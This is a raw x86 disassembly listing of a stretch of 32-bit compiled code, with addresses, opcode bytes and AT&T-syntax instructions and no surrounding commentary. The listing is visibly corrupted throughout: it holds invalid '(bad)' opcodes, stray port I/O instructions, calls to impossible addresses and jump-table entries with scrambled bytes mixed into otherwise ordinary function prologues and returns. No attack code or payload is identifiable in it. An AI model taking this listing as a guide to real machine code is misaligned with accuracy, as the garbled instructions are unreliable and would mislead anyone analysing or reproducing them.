  4084b3:	7f 07                	jg     0x4084bc
  4084b5:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4084b8:	85 c0                	test   %eax,%eax
  4084ba:	74 04                	je     0x4084c0
  4084bc:	de 06                	fiadds (%esi)
  4084be:	f9                   	stc
  4084bf:	46                   	inc    %esi
  4084c0:	8b 45 18             	mov    0x18(%ebp),%eax
  4084c3:	7a 0b                	jp     0x4084d0
  4084c5:	84 c9                	test   %cl,%cl
  4084c7:	74 0b                	je     0x4084d4
  4084c9:	1d 0e 8a 92 01       	sbb    $0x1928a0e,%eax
  4084ce:	46                   	inc    %esi
  4084cf:	68 84 e8 75 b8       	push   $0xb875e884
  4084d4:	80 31 66             	xorb   $0x66,(%ecx)
  4084d7:	74 68                	je     0x408541
  4084d9:	71 16                	jno    0x4084f1
  4084db:	46                   	inc    %esi
  4084dc:	48                   	dec    %eax
  4084dd:	89 45 18             	mov    %eax,0x18(%ebp)
  4084e0:	74 53                	je     0x408535
  4084e2:	8d                   	lea    (bad),%edx
  4084e3:	d7                   	xlat   %ds:(%ebx)
  4084e4:	15 8d 55 f8 b5       	adc    $0xb5f8558d,%eax
  4084e9:	7b 4d                	jnp    0x408538
  4084eb:	08 52 51             	or     %dl,0x51(%edx)
  4084ee:	6a 00                	push   $0x0
  4084f0:	50                   	push   %eax
  4084f1:	e8 fa fb ff f3       	call   0xf44080f0
  4084f6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4084f9:	83 c4 14             	add    $0x14,%esp
  4084fc:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4084ff:	e3 db                	jecxz  0x4084dc
  408501:	2e fa                	cs cli
  408503:	c2 46 83             	ret    $0x8346
  408506:	cb                   	lret
  408507:	f3 8d 54 11 2b       	repz lea 0x2b(%ecx,%edx,1),%edx
  40850c:	88 56 ff             	mov    %dl,-0x1(%esi)
  40850f:	75 06                	jne    0x408517
  408511:	c6 06 30             	movb   $0x30,(%esi)
  408514:	46                   	inc    %esi
  408515:	eb 04                	jmp    0x40851b
  408517:	85 fe                	test   %edi,%esi
  408519:	92                   	xchg   %eax,%edx
  40851a:	26 8a 10             	mov    %es:(%eax),%dl
  40851d:	5c                   	pop    %esp
  40851e:	16                   	push   %ss
  40851f:	76 40                	jbe    0x408561
  408521:	49                   	dec    %ecx
  408522:	75 f7                	jne    0x40851b
  408524:	8b 45 20             	mov    0x20(%ebp),%eax
  408527:	8b 4d 24             	mov    0x24(%ebp),%ecx
  40852a:	2b f0                	sub    %eax,%esi
  40852c:	5f                   	pop    %edi
  40852d:	89 c6                	mov    %eax,%esi
  40852f:	5e                   	pop    %esi
  408530:	5b                   	pop    %ebx
  408531:	8b e5                	mov    %ebp,%esp
  408533:	5d                   	pop    %ebp
  408534:	c3                   	ret
  408535:	c6                   	(bad)
  408536:	77 2b                	ja     0x408563
  408538:	46                   	inc    %esi
  408539:	de 44 9b 46          	fiadds 0x46(%ebx,%ebx,4)
  40853d:	c6 06 30             	movb   $0x30,(%esi)
  408540:	46                   	inc    %esi
  408541:	8b 45 74             	mov    0x74(%ebp),%eax
  408544:	8b 4d 24             	mov    0x24(%ebp),%ecx
  408547:	2b 61 bc             	sub    -0x44(%ecx),%esp
  40854a:	81 a9 5e 5b 8b 78 5d 	subl   $0x9090c35d,0x788b5b5e(%ecx)
  408551:	c3 90 90 
  408554:	91                   	xchg   %eax,%ecx
  408555:	90                   	nop
  408556:	90                   	nop
  408557:	90                   	nop
  408558:	90                   	nop
  408559:	90                   	nop
  40855a:	1b 90 cd 90 90 90    	sbb    -0x6f6f6f33(%eax),%edx
  408560:	55                   	push   %ebp
  408561:	e6 ec                	out    %al,$0xec
  408563:	8b 45 97             	mov    -0x69(%ebp),%eax
  408566:	8b 4d 18             	mov    0x18(%ebp),%ecx
  408569:	8b 55 14             	mov    0x14(%ebp),%edx
  40856c:	50                   	push   %eax
  40856d:	8b 45 aa             	mov    -0x56(%ebp),%eax
  408570:	f8                   	clc
  408571:	00 51 8b             	add    %dl,-0x75(%ecx)
  408574:	4d                   	dec    %ebp
  408575:	0c 52                	or     $0x52,%al
  408577:	22 55 08             	and    0x8(%ebp),%dl
  40857a:	50                   	push   %eax
  40857b:	3e 5d                	ds pop %ebp
  40857d:	e8 6e f9 ff ff       	call   0x407ef0
  408582:	83 c4 1c             	add    $0x1c,%esp
  408585:	5d                   	pop    %ebp
  408586:	c3                   	ret
  408587:	90                   	nop
  408588:	90                   	nop
  408589:	90                   	nop
  40858a:	90                   	nop
  40858b:	90                   	nop
  40858c:	90                   	nop
  40858d:	90                   	nop
  40858e:	90                   	nop
  40858f:	68 55 8b ec 53       	push   $0x53ec8b55
  408594:	56                   	push   %esi
  408595:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408596:	8b 7d b1             	mov    -0x4f(%ebp),%edi
  408599:	be 01 7d a4 00       	mov    $0xa47d01,%esi
  40859e:	9f                   	lahf
  40859f:	cf                   	iret
  4085a0:	8b 45 6a             	mov    0x6a(%ebp),%eax
  4085a3:	bb 03 c2 40 00       	mov    $0x40c203,%ebx
  4085a8:	d3 e6                	shl    %cl,%esi
  4085aa:	8a 4c 17 4e          	mov    0x4e(%edi,%edx,1),%cl
  4085ae:	80 f9 c6             	cmp    $0xc6,%cl
  4085b1:	c5 12                	lds    (%edx),%edx
  4085b3:	bb a8 c2 fd 00       	mov    $0xfdc2a8,%ebx
  4085b8:	8b f2                	mov    %edx,%esi
  4085ba:	08 d3                	or     %dl,%bl
  4085bc:	ce                   	into
  4085bd:	c6                   	(bad)
  4085be:	23 ca                	and    %edx,%ecx
  4085c0:	8a 0c 55 88 d0 8b cf 	mov    -0x30742f78(,%edx,2),%cl
  4085c7:	d3 ea                	shr    %cl,%edx
  4085c9:	85 d2                	test   %edx,%edx
  4085cb:	75 ee                	jne    0x4085bb
  4085cd:	8b 91 14 4d 55 18    	mov    0x18554d14(%ecx),%edx
  4085d3:	2b c8                	sub    %eax,%ecx
  4085d5:	79 5e                	jns    0x408635
  4085d7:	89 0a                	mov    %ecx,(%edx)
  4085d9:	5b                   	pop    %ebx
  4085da:	5d                   	pop    %ebp
  4085db:	62 90 90 90 33 55    	bound  %edx,0x55339090(%eax)
  4085e1:	87 5d 75             	xchg   %ebx,0x75(%ebp)
  4085e4:	4d                   	dec    %ebp
  4085e5:	10 53 56             	adc    %dl,0x56(%ebx)
  4085e8:	8a 45 14             	mov    0x14(%ebp),%al
  4085eb:	57                   	push   %edi
  4085ec:	db 01                	fildl  (%ecx)
  4085ee:	00 b3 00 8b 75 f2    	add    %dh,-0xd8a7500(%ebx)
  4085f4:	bb e4 c2 40 00       	mov    $0x40c2e4,%ebx
  4085f9:	0f e7 4f 1f          	movntq %mm1,0x1f(%edi)
  4085fd:	58                   	pop    %eax
  4085fe:	74 05                	je     0x408605
  408600:	bb d0 c2 40 00       	mov    $0x40c2d0,%ebx
  408605:	ab                   	stos   %eax,%es:(%edi)
  408606:	3d 0c 24 45 4a       	cmp    $0x4a45240c,%eax
  40860b:	94                   	xchg   %eax,%esp
  40860c:	d2 77 70             	shlb   %cl,0x70(%edi)
  40860f:	72 05                	jb     0x408616
  408611:	83 f8 b0             	cmp    $0xffffffb0,%eax
  408614:	77 1b                	ja     0x408631
  408616:	8b 9f ca 52 8b 55    	mov    0x558b52ca(%edi),%ebx
  40861c:	18 52 8b             	sbb    %dl,-0x75(%edx)
  40861f:	55                   	push   %ebp
  408620:	14 52                	adc    $0x52,%al
  408622:	51                   	push   %ecx
  408623:	50                   	push   %eax
  408624:	e8 67 ff ff ff       	call   0x408590
  408629:	83 c4 d5             	add    $0xffffffd5,%esp
  40862c:	5f                   	pop    %edi
  40862d:	5e                   	pop    %esi
  40862e:	5b                   	pop    %ebx
  40862f:	5d                   	pop    %ebp
  408630:	43                   	inc    %ebx
  408631:	8b c8                	mov    %eax,%ecx
  408633:	4e                   	dec    %esi
  408634:	23 42 8a             	and    -0x76(%edx),%eax
  408637:	0c 19                	or     $0x19,%al
  408639:	88 0e                	mov    %cl,(%esi)
  40863b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40863e:	e8 bd 0b 00 c7       	call   0xc7409200
  408643:	8b c8                	mov    %eax,%ecx
  408645:	0b ca                	or     %edx,%ecx
  408647:	75 2f                	jne    0x408678
  408649:	be 45 18 8b 55       	mov    $0x558b1845,%esi
  40864e:	1c 2b                	sbb    $0x2b,%al
  408650:	b0 5f                	mov    $0x5f,%al
  408652:	89 02                	mov    %eax,(%edx)
  408654:	8b c6                	mov    %esi,%eax
  408656:	5e                   	pop    %esi
  408657:	5b                   	pop    %ebx
  408658:	5d                   	pop    %ebp
  408659:	8b 90 90 90 b4 90    	mov    -0x6f4b6f70(%eax),%edx
  40865f:	90                   	nop
  408660:	55                   	push   %ebp
  408661:	93                   	xchg   %eax,%ebx
  408662:	ec                   	in     (%dx),%al
  408663:	8b 4d 63             	mov    0x63(%ebp),%ecx
  408666:	8b 5a 08             	mov    0x8(%edx),%ebx
  408669:	8b 55 0c             	mov    0xc(%ebp),%edx
  40866c:	e0 8b                	loopne 0x4085f9
  40866e:	00 52 8e             	add    %dl,-0x72(%edx)
  408671:	78 6a                	js     0x4086dd
  408673:	04 50                	add    $0x50,%al
  408675:	e8 16 ff ff ff       	call   0x408590
  40867a:	44                   	inc    %esp
  40867b:	c4 14 5d c3 90 55 8b 	les    -0x74aa6f3d(,%ebx,2),%edx
  408682:	ec                   	in     (%dx),%al
  408683:	83 ec 08             	sub    $0x8,%esp
  408686:	56                   	push   %esi
  408687:	8b 75 0c             	mov    0xc(%ebp),%esi
  40868a:	85 f6                	test   %esi,%esi
  40868c:	75 08                	jne    0x408696
  40868e:	89 75 f8             	mov    %esi,-0x8(%ebp)
  408691:	89 75 fc             	mov    %esi,-0x4(%ebp)
  408694:	eb 9f                	jmp    0x408635
  408696:	8b 45 08             	mov    0x8(%ebp),%eax
  408699:	89 d2                	mov    %edx,%edx
  40869b:	b3 8d                	mov    $0x8d,%bl
  40869d:	44                   	inc    %esp
  40869e:	30 ff                	xor    %bh,%bh
  4086a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4086a3:	8b 55 10             	mov    0x10(%ebp),%edx
  4086a6:	8d 9f 14 51 8d 45    	lea    0x458d5114(%edi),%ebx
  4086ac:	f8                   	clc
  4086ad:	52                   	push   %edx
  4086ae:	50                   	push   %eax
  4086af:	68 d0 86 40 88       	push   $0x884086d0
  4086b4:	e8 2e 57 fa ff       	call   0x3adde7
  4086b9:	e3 ac                	jecxz  0x408667
  4086bb:	3e 06                	ds push %es
  4086bd:	8b c0                	mov    %eax,%eax
  4086bf:	f8                   	clc
  4086c0:	ec                   	in     (%dx),%al
  4086c1:	01 00                	add    %eax,(%eax)
  4086c3:	83 86 ff 38 03 8d 46 	addl   $0x46,-0x72fcc701(%esi)
  4086ca:	ff a6 26 e5 5d c3    	jmp    *-0x3ca21ada(%esi)
  4086d0:	83 93 ff c3 90 90 90 	adcl   $0xffffff90,-0x6f6f3c01(%ebx)
  4086d7:	90                   	nop
  4086d8:	aa                   	stos   %al,%es:(%edi)
  4086d9:	90                   	nop
  4086da:	90                   	nop
  4086db:	90                   	nop
  4086dc:	9e                   	sahf
  4086dd:	90                   	nop
  4086de:	20 90 55 35 ec 8b    	and    %dl,-0x7413caab(%eax)
  4086e4:	45                   	inc    %ebp
  4086e5:	08 3d e0 4e 00 00    	or     %bh,0x4ee0
  4086eb:	f5                   	cmc
  4086ec:	15 db 4d 10 8b       	adc    $0x8b104ddb,%eax
  4086f1:	55                   	push   %ebp
  4086f2:	0c 51                	or     $0x51,%al
  4086f4:	52                   	push   %edx
  4086f5:	50                   	push   %eax
  4086f6:	c4 85 03 00 00 83    	les    -0x7cfffffd(%ebp),%eax
  4086fc:	c4 0c 0b             	les    (%ebx,%ecx,1),%ecx
  4086ff:	c2 0c 00             	ret    $0xc
  408702:	3d c0 d4 01 00       	cmp    $0x1d4c0,%eax
  408707:	db 18                	fistpl (%eax)
  408709:	50                   	push   %eax
  40870a:	e8 91 f2 2e 36       	call   0x366f79a0
  40870f:	ed                   	in     (%dx),%eax
  408710:	4d                   	dec    %ebp
  408711:	0c 91                	or     $0x91,%al
  408713:	8b 45 2e             	mov    0x2e(%ebp),%eax
  408716:	50                   	push   %eax
  408717:	51                   	push   %ecx
  408718:	e8 63 00 00 00       	call   0x408780
  40871d:	83 c4 10             	add    $0x10,%esp
  408720:	5d                   	pop    %ebp
  408721:	c2 0c 00             	ret    $0xc
  408724:	36 d3 39             	sarl   %cl,%ss:(%ecx)
  408727:	0a d9                	or     %cl,%bl
  408729:	7d 19                	jge    0x408744
  40872b:	8b 55 10             	mov    0x10(%ebp),%edx
  40872e:	8b 58 0c             	mov    0xc(%eax),%ebx
  408731:	68 54 f9 40 de       	push   $0xde40f954
  408736:	a3 50 e8 43 00       	mov    %eax,0x43e850
  40873b:	00 00                	add    %al,(%eax)
  40873d:	96                   	xchg   %eax,%esi
  40873e:	c4 0c 5d c2 0c 4f 3d 	les    0x3d4f0cc2(,%ebx,2),%ecx
  408745:	80 fc 0a             	cmp    $0xa,%ah
  408748:	00 7d 19             	add    %bh,0x19(%ebp)
  40874b:	8b 4d 01             	mov    0x1(%ebp),%ecx
  40874e:	8b 55 0c             	mov    0xc(%ebp),%edx
  408751:	68 54 f9 40 00       	push   $0x40f954
  408756:	e6 52                	out    %al,$0x52
  408758:	e8 23 00 00 00       	call   0x408780
  40875d:	83 c4 0c             	add    $0xc,%esp
  408760:	5d                   	pop    %ebp
  408761:	c2 0c 00             	ret    $0xc
  408764:	8b 5f 0c             	mov    0xc(%edi),%ebx
  408767:	b0 f2                	mov    $0xf2,%al
  408769:	03 f5                	add    %ebp,%esi
  40876b:	ff 50 8b             	call   *-0x75(%eax)
  40876e:	45                   	inc    %ebp
  40876f:	10 50 51             	adc    %dl,0x51(%eax)
  408772:	e8 59 02 00 00       	call   0x4089d0
  408777:	83 c4 0c             	add    $0xc,%esp
  40877a:	5d                   	pop    %ebp
  40877b:	c2 0c 00             	ret    $0xc
  40877e:	90                   	nop
  40877f:	90                   	nop
  408780:	55                   	push   %ebp
  408781:	8b ec                	mov    %esp,%ebp
  408783:	37                   	aaa
  408784:	45                   	inc    %ebp
  408785:	0c a2                	or     $0xa2,%al
  408787:	4d                   	dec    %ebp
  408788:	10 56 8b             	adc    %dl,-0x75(%esi)
  40878b:	75 e6                	jne    0x408773
  40878d:	50                   	push   %eax
  40878e:	49                   	dec    %ecx
  40878f:	56                   	push   %esi
  408790:	e8 bb 1d 00 00       	call   0x40a550
  408795:	8b c6                	mov    %esi,%eax
  408797:	5e                   	pop    %esi
  408798:	5d                   	pop    %ebp
  408799:	c3                   	ret
  40879a:	7d 90                	jge    0x40872c
  40879c:	90                   	nop
  40879d:	90                   	nop
  40879e:	6c                   	insb   (%dx),%es:(%edi)
  40879f:	90                   	nop
  4087a0:	55                   	push   %ebp
  4087a1:	67 ec                	addr16 in (%dx),%al
  4087a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4087a6:	3d 71 11 01 c1       	cmp    $0xc1011171,%eax
  4087ab:	0f 4d c3             	cmovge %ebx,%eax
  4087ae:	00 00                	add    %al,(%eax)
  4087b0:	00 0f                	add    %cl,(%edi)
  4087b2:	84 b6 00 8c 6d 05    	test   %dh,0x56d8c00(%esi)
  4087b8:	8f                   	(bad)
  4087b9:	b1 ff                	mov    $0xff,%cl
  4087bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4087bc:	e7 f8                	out    %eax,$0xf8
  4087be:	19 9d 87 37 01 00    	sbb    %ebx,0x13787(%ebp)
  4087c4:	00 c5                	add    %al,%ch
  4087c6:	24 85                	and    $0x85,%al
  4087c8:	94                   	xchg   %eax,%esp
  4087c9:	89 40 00             	mov    %eax,0x0(%eax)
  4087cc:	b8 84 00 41 90       	mov    $0x90410084,%eax
  4087d1:	5d                   	pop    %ebp
  4087d2:	ce                   	into
  4087d3:	b8 60 00 41 39       	mov    $0x39410060,%eax
  4087d8:	5d                   	pop    %ebp
  4087d9:	c3                   	ret
  4087da:	b8 cc 00 41 00       	mov    $0x4100cc,%eax
  4087df:	5d                   	pop    %ebp
  4087e0:	c3                   	ret
  4087e1:	55                   	push   %ebp
  4087e2:	10 00                	adc    %al,(%eax)
  4087e4:	41                   	inc    %ecx
  4087e5:	00 5d 75             	add    %bl,0x75(%ebp)
  4087e8:	7f e4                	jg     0x4087ce
  4087ea:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4087eb:	40                   	inc    %eax
  4087ec:	00 de                	add    %bl,%dh
  4087ee:	c3                   	ret
  4087ef:	b8 b4 ff 40 00       	mov    $0x40ffb4,%eax
  4087f4:	06                   	push   %es
  4087f5:	c3                   	ret
  4087f6:	b8 88 ff 40 00       	mov    $0x40ff88,%eax
  4087fb:	5d                   	pop    %ebp
  4087fc:	c3                   	ret
  4087fd:	b8 50 ff 40 00       	mov    $0x40ff50,%eax
  408802:	cb                   	lret
  408803:	c3                   	ret
  408804:	61                   	popa
  408805:	20 ff                	and    %bh,%bh
  408807:	40                   	inc    %eax
  408808:	00 5d c3             	add    %bl,-0x3d(%ebp)
  40880b:	84 f0                	test   %dh,%al
  40880d:	0c de                	or     $0xde,%al
  40880f:	00 e2                	add    %ah,%dl
  408811:	c3                   	ret
  408812:	b8 b4 fe 40 00       	mov    $0x40feb4,%eax
  408817:	5d                   	pop    %ebp
  408818:	c3                   	ret
  408819:	b8 05 fe 40 56       	mov    $0x5640fe05,%eax
  40881e:	aa                   	stos   %al,%es:(%edi)
  40881f:	c3                   	ret
  408820:	8a e5                	mov    %ch,%ah
  408822:	f6 40 2d 5d          	testb  $0x5d,0x2d(%eax)
  408826:	c3                   	ret
  408827:	b8 54 fe 40 2e       	mov    $0x2e40fe54,%eax
  40882c:	5d                   	pop    %ebp
  40882d:	c3                   	ret
  40882e:	b8 2c 2b 40 00       	mov    $0x402b2c,%eax
  408833:	5d                   	pop    %ebp
  408834:	c3                   	ret
  408835:	b8 10 f1 40 00       	mov    $0x40f110,%eax
  40883a:	5d                   	pop    %ebp
  40883b:	5f                   	pop    %edi
  40883c:	b8 f4 fd 40 00       	mov    $0x40fdf4,%eax
  408841:	5d                   	pop    %ebp
  408842:	c3                   	ret
  408843:	b8 d4 fd 40 00       	mov    $0x40fdd4,%eax
  408848:	55                   	push   %ebp
  408849:	c3                   	ret
  40884a:	7e 79                	jle    0x4088c5
  40884c:	fd                   	std
  40884d:	40                   	inc    %eax
  40884e:	c8 5d 6c b8          	enter  $0x6c5d,$0xb8
  408852:	6c                   	insb   (%dx),%es:(%edi)
  408853:	fd                   	std
  408854:	96                   	xchg   %eax,%esi
  408855:	00 5d c3             	add    %bl,-0x3d(%ebp)
  408858:	62 4e 2f             	bound  %ecx,0x2f(%esi)
  40885b:	40                   	inc    %eax
  40885c:	80 5d c3 d3          	sbbb   $0xd3,-0x3d(%ebp)
  408860:	1c fd                	sbb    $0xfd,%al
  408862:	75 b0                	jne    0x408814
  408864:	5d                   	pop    %ebp
  408865:	c3                   	ret
  408866:	b8 4c fd d5 00       	mov    $0xd5fd4c,%eax
  40886b:	5d                   	pop    %ebp
  40886c:	c3                   	ret
  40886d:	b8 c0 fc 40 00       	mov    $0x40fcc0,%eax
  408872:	5d                   	pop    %ebp
  408873:	c3                   	ret
  408874:	05 70 ee fe ff       	add    $0xfffeee70,%eax
  408879:	83 f8 6f             	cmp    $0x6f,%eax
  40887c:	77 7e                	ja     0x4088fc
  40887e:	ff 24 85 6c 89 40 00 	jmp    *0x40896c(,%eax,4)
  408885:	19 70 6b             	sbb    %esi,0x6b(%eax)
  408888:	18 87 5d c3 c1 58    	sbb    %al,0x58c1c35d(%edi)
  40888e:	fc                   	cld
  40888f:	40                   	inc    %eax
  408890:	37                   	aaa
  408891:	5d                   	pop    %ebp
  408892:	09 b8 49 fc 40 00    	or     %edi,0x40fc49(%eax)
  408898:	5d                   	pop    %ebp
  408899:	a9 b8 f0 59 40       	test   $0x4059f0b8,%eax
  40889e:	61                   	popa
  40889f:	5d                   	pop    %ebp
  4088a0:	c3                   	ret
  4088a1:	b8 aa fb 40 00       	mov    $0x40fbaa,%eax
  4088a6:	5d                   	pop    %ebp
  4088a7:	c3                   	ret
  4088a8:	b8 98 fb 40 00       	mov    $0x40fb98,%eax
  4088ad:	97                   	xchg   %eax,%edi
  4088ae:	c3                   	ret
  4088af:	b8 60 fb 40 00       	mov    $0x40fb60,%eax
  4088b4:	5d                   	pop    %ebp
  4088b5:	0b b8 38 fb 40 1e    	or     0x1e40fb38(%eax),%edi
  4088bb:	5d                   	pop    %ebp
  4088bc:	c3                   	ret
  4088bd:	b8 00 fb 40 00       	mov    $0x40fb00,%eax
  4088c2:	5d                   	pop    %ebp
  4088c3:	c3                   	ret
  4088c4:	29 ec                	sub    %ebp,%esp
  4088c6:	fa                   	cli
  4088c7:	99                   	cltd
  4088c8:	00 5d 47             	add    %bl,0x47(%ebp)
  4088cb:	07                   	pop    %es
  4088cc:	28 fa                	sub    %bh,%dl
  4088ce:	12 00                	adc    (%eax),%al
  4088d0:	5d                   	pop    %ebp
  4088d1:	c3                   	ret
  4088d2:	b8 90 fa 40 00       	mov    $0x40fa90,%eax
  4088d7:	b8 71 b8 64 fa       	mov    $0xfa64b871,%eax
  4088dc:	40                   	inc    %eax
  4088dd:	00 5d c3             	add    %bl,-0x3d(%ebp)
  4088e0:	b8 34 56 40 00       	mov    $0x405634,%eax
  4088e5:	92                   	xchg   %eax,%edx
  4088e6:	c3                   	ret
  4088e7:	b8 f0 f9 96 00       	mov    $0x96f9f0,%eax
  4088ec:	5d                   	pop    %ebp
  4088ed:	c3                   	ret
  4088ee:	b8 b4 2e 40 00       	mov    $0x402eb4,%eax
  4088f3:	6c                   	insb   (%dx),%es:(%edi)
  4088f4:	c3                   	ret
  4088f5:	b8 9c d2 40 00       	mov    $0x40d29c,%eax
  4088fa:	f4                   	hlt
  4088fb:	91                   	xchg   %eax,%ecx
  4088fc:	b8 7c f9 40 00       	mov    $0x40f97c,%eax
  408901:	5d                   	pop    %ebp
  408902:	c3                   	ret
  408903:	90                   	nop
  408904:	cc                   	int3
  408905:	9c                   	pushf
  408906:	40                   	inc    %eax
  408907:	00 fc                	add    %bh,%ah
  408909:	88 40 00             	mov    %al,0x0(%eax)
  40890c:	d3 59 40             	rcrl   %cl,0x40(%ecx)
  40890f:	00 da                	add    %bl,%dl
  408911:	87 96 00 e1 87 40    	xchg   %edx,0x4087e100(%esi)
  408917:	00 4d 87             	add    %cl,-0x79(%ebp)
  40891a:	40                   	inc    %eax
  40891b:	00 ef                	add    %ch,%bh
  40891d:	87 40 00             	xchg   %eax,0x0(%eax)
  408920:	9d                   	popf
  408921:	87 4f e1             	xchg   %ecx,-0x1f(%edi)
  408924:	bc c5 40 00 04       	mov    $0x40040c5,%esp
  408929:	88 40 7f             	mov    %al,0x7f(%eax)
  40892c:	0b 88 40 00 12 88    	or     -0x77edffc0(%eax),%ecx
  408932:	fd                   	std
  408933:	d8 d4                	fcom   %st(4)
  408935:	88 40 00             	mov    %al,0x0(%eax)
  408938:	19 88 40 43 27 88    	sbb    %ecx,-0x77d8bcc0(%eax)
  40893e:	40                   	inc    %eax
  40893f:	00 2e                	add    %ch,(%esi)
  408941:	88 40 00             	mov    %al,0x0(%eax)
  408944:	01 88 40 00 20 88    	add    %ecx,-0x77dfffc0(%eax)
  40894a:	40                   	inc    %eax
  40894b:	00 35 88 40 45 c4    	add    %dh,0xc4454088
  408951:	88 cd                	mov    %cl,%ch
  408953:	00 43 fb             	add    %al,-0x5(%ebx)
  408956:	40                   	inc    %eax
  408957:	00 4a a3             	add    %cl,-0x5d(%edx)
  40895a:	40                   	inc    %eax
  40895b:	00 51 88             	add    %dl,-0x78(%ecx)
  40895e:	40                   	inc    %eax
  40895f:	00 58 88             	add    %bl,-0x78(%eax)
  408962:	40                   	inc    %eax
  408963:	00 fc                	add    %bh,%ah
  408965:	88 40 b4             	mov    %al,-0x4c(%eax)
  408968:	5f                   	pop    %edi
  408969:	88 40 00             	mov    %al,0x0(%eax)
  40896c:	85 88 42 00 8c 88    	test   %ecx,-0x7773ffbe(%eax)
  408972:	40                   	inc    %eax
  408973:	00 93 18 65 00 9a    	add    %dl,-0x65ff9ae8(%ebx)
  408979:	88 40 00             	mov    %al,0x0(%eax)
  40897c:	a1 88 40 4d a8       	mov    0xa84d4088,%eax
  408981:	88 40 00             	mov    %al,0x0(%eax)
  408984:	af                   	scas   %es:(%edi),%eax
  408985:	88 40 00             	mov    %al,0x0(%eax)
  408988:	fc                   	cld
  408989:	88 40 00             	mov    %al,0x0(%eax)
  40898c:	35 88 40 00 fc       	xor    $0xfc004088,%eax
  408991:	88 a8 00 b6 88 40    	mov    %ch,0x4088b600(%eax)
  408997:	ba bd 88 40 00       	mov    $0x4088bd,%edx
  40899c:	c4 88 40 00 cb 88    	les    -0x7734ffc0(%eax),%ecx
  4089a2:	40                   	inc    %eax
  4089a3:	00 fc                	add    %bh,%ah
  4089a5:	88 40 cc             	mov    %al,-0x34(%eax)
  4089a8:	fc                   	cld
  4089a9:	88 40 00             	mov    %al,0x0(%eax)
  4089ac:	fc                   	cld
  4089ad:	88 40 00             	mov    %al,0x0(%eax)
  4089b0:	d2 88 40 db d9 88    	rorb   %cl,-0x772624c0(%eax)
  4089b6:	40                   	inc    %eax
  4089b7:	00 e0                	add    %ah,%al
  4089b9:	88 40 00             	mov    %al,0x0(%eax)
  4089bc:	e7 88                	out    %eax,$0x88
  4089be:	53                   	push   %ebx
  4089bf:	00 0f                	add    %cl,(%edi)
  4089c1:	88 40 39             	mov    %al,0x39(%eax)
  4089c4:	f5                   	cmc
  4089c5:	88 40 00             	mov    %al,0x0(%eax)
  4089c8:	9a 2f 90 90 90 a1 90 	lcall  $0x90a1,$0x9090902f
  4089cf:	90                   	nop
  4089d0:	55                   	push   %ebp
  4089d1:	95                   	xchg   %eax,%ebp
  4089d2:	ec                   	in     (%dx),%al
  4089d3:	a3 8b 5d 0c 56       	mov    %eax,0x560c5d8b
  4089d8:	8b 75 08             	mov    0x8(%ebp),%esi
  4089db:	57                   	push   %edi
  4089dc:	8b 7d 10             	mov    0x10(%ebp),%edi
  4089df:	6a 00                	push   $0x0
  4089e1:	53                   	push   %ebx
  4089e2:	56                   	push   %esi
  4089e3:	68 00 04 c8 a1       	push   $0xa1c80400
  4089e8:	57                   	push   %edi
  4089e9:	d1 00                	roll   $1,(%eax)
  4089eb:	22 cb                	and    %bl,%cl
  4089ed:	02 3d 00 ff 9f cf    	add    0xcf9fff00,%bh
  4089f3:	c0 40 00 85          	rolb   $0x85,0x0(%eax)
  4089f7:	c0 75 44 8b          	shlb   $0x8b,0x44(%ebp)
  4089fb:	92                   	xchg   %eax,%edx
  4089fc:	1c c3                	sbb    $0xc3,%al
  4089fe:	40                   	inc    %eax
  4089ff:	00 85 c9 74 5b 39    	add    %al,0x395b74c9(%ebp)
  408a05:	3c c5                	cmp    $0xc5,%al
  408a07:	5f                   	pop    %edi
  408a08:	c3                   	ret
  408a09:	40                   	inc    %eax
  408a0a:	00 e0                	add    %ah,%al
  408a0c:	0e                   	push   %cs
  408a0d:	8b 0c c5 6d c3 40 00 	mov    0x40c36d(,%eax,8),%ecx
  408a14:	40                   	inc    %eax
  408a15:	85 c9                	test   %ecx,%ecx
  408a17:	75 eb                	jne    0x408a04
  408a19:	eb 44                	jmp    0x408a5f
  408a1b:	8b c3                	mov    %ebx,%eax
  408a1d:	c5 1c c3             	lds    (%ebx,%eax,8),%ebx
  408a20:	40                   	inc    %eax
  408a21:	00 53 50             	add    %dl,0x50(%ebx)
  408a24:	56                   	push   %esi
  408a25:	e8 26 1b 00 0b       	call   0xb40a550
  408a2a:	1c 46                	sbb    $0x46,%al
  408a2c:	83 c9 ff             	or     $0xffffffff,%ecx
  408a2f:	33 c0                	xor    %eax,%eax
  408a31:	f2 ae                	repnz scas %es:(%edi),%al
  408a33:	b9 d1 31 8b c1       	mov    $0xc18b31d1,%ecx
  408a38:	74 22                	je     0x408a5c
  408a3a:	fe                   	(bad)
  408a3b:	61                   	popa
  408a3c:	23 31                	and    (%ecx),%esi
  408a3e:	8a 15 49 ff 48 80    	mov    0x8048ff49,%dl
  408a44:	f9                   	stc
  408a45:	0d 04 7f 14 f9       	or     $0xf9147f04,%eax
  408a4a:	77 75                	ja     0x408ac1
  408a4c:	04 c6                	add    $0xc6,%al
  408a4e:	04 30                	add    $0x30,%al
  408a50:	20 d2                	and    %dl,%dl
  408a52:	c0 01 e9             	rolb   $0xe9,(%ecx)
  408a55:	4f                   	dec    %edi
  408a56:	94                   	xchg   %eax,%esp
  408a57:	5f                   	pop    %edi
  408a58:	5e                   	pop    %esi
  408a59:	3a 5d c3             	cmp    -0x3d(%ebp),%bl
  408a5c:	8b 7d 10             	mov    0x10(%ebp),%edi
  408a5f:	57                   	push   %edi
  408a60:	68 74 00 41 00       	push   $0x410074
  408a65:	53                   	push   %ebx
  408a66:	f9                   	stc
  408a67:	83 14 fc ff          	adcl   $0xffffffff,(%esp,%edi,8)
  408a6b:	ff 83 c4 d2 45 c6    	incl   -0x39ba2d3c(%ebx)
  408a71:	5f                   	pop    %edi
  408a72:	5e                   	pop    %esi
  408a73:	5b                   	pop    %ebx
  408a74:	5d                   	pop    %ebp
  408a75:	c3                   	ret
  408a76:	b2 90                	mov    $0x90,%dl
  408a78:	90                   	nop
  408a79:	90                   	nop
  408a7a:	90                   	nop
  408a7b:	90                   	nop
  408a7c:	90                   	nop
  408a7d:	90                   	nop
  408a7e:	90                   	nop
  408a7f:	90                   	nop
